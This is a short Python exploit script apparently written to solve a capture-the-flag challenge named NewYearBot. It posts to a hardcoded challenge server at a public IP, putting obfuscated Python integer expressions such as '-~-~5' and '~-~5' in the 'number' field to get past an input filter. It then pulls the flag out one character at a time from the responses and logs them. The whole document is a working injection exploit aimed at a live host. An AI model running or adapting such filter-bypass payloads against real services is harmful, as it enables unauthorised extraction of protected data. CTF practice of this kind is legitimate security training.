import requests

chall_url = 'http://172.105.120.180:9999/'

# chall_url = 'http://127.0.0.1:5000/'

final_flag = []

f = open('log_t_file', 'a+')

# ctf_idx = list(range(7))
# ctf_idx.extend(['~-~5','~-~4'])
# ctf_idx.extend(list(range(-5,0)))

ctf_idx = ['0', '1', '2', '3', '4', '5', '-~5', '-~-~5', '-~-~-~5', '-~-~-~-~5', '-~-~-~-~-~5', '-~-~-~-~-~-~5', '-~-~-~-~-~-~-~5', '~-~-~-~-~-~-~5', '~-~-~-~-~-~5', '~-~-~-~-~5', '~-~-~-~5', '~-~-~5', '~-~5', '~5', '-5', '-4', '-3', '-2', '-1', ]
# print(ctf_idx)

for i in ctf_idx:
    r = requests.post(chall_url, data= {
        'type': 'FL4G',
        'number': str(i)
    })

    flag_chr = r.text[r.text.find('NewYearBot >> </font></strong>')+len('NewYearBot >> </font></strong>')]

    f.write(r.text)

    print(flag_chr)

    final_flag.append(flag_chr)

print(''.join(final_flag))

f.close()

